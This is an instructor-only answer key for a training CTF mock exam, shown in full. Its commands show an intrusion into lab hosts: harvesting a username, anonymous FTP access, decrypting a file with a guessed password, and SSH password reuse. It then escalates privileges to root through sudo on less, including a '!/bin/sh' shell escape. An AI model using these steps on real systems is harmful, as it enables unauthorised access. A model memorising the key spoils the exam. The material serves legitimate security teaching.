# Week 10 Mock Exam — CTF Walkthrough — INSTRUCTOR ONLY

## Flag 1 — user.txt (`flag{mock10_ssh_foothold}`)

```bash
curl http://10.10.50.10   # find username "jreyes" in HTML comment

ftp 10.10.50.11            # login: anonymous / anonymous
cd pub
get welcome.txt            # password policy hint: PetName + current year
get backup_notice.txt.enc  # lands on the attacker machine
bye

openssl enc -aes-256-cbc -pbkdf2 -d -in backup_notice.txt.enc -k Rusty2026  # confirms password reuse on SSH
ssh jreyes@10.10.50.12          # password: Rusty2026
cat /home/jreyes/user.txt
```

## Flag 2 — root.txt (`flag{mock10_privesc_complete}`)

```bash
sudo -l                     # (ALL) NOPASSWD: /usr/bin/less
sudo less /root/root.txt
```

(Or the interactive form: `sudo less /etc/hostname` then `!/bin/sh` for a
full root shell.)
